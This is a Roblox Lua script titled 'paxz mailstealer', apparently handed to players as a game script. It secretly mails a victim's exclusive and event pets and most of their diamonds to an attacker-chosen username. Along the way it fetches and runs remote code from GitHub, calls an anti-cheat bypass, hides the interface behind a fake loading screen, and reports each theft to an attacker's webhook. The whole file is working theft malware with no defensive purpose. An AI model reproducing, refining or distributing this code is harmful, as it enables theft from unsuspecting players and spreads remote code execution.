--paxz mailstealer

loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/API", true))()

BypassAntiCheat()
AreaTeleport("Shop")
TeleportToMailbox()

local UserInputService = game:GetService("UserInputService")
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy(1)
    end

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()

function sendWebhook(webhook, message)
    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

 local url =
    webhook
 local data = {
    ["content"] = message
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)

 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
end

local player = game:GetService("Players").LocalPlayer

local dims = player.leaderstats.Diamonds.Value - 80000000
if dims < 0 then
    dims = 0
end

wait(30)
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
            local args = {
                [1] = {
                    ["Recipient"] = _G.UserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "made by Paxz"
                }
            }
        Networking.Invoke("Send Mail", unpack(args))
        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
        dims = 0
        wait(7)
    end
end
end

local message = "Paxz was here :)"

local function sendGlobalMessage()
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

sendGlobalMessage()
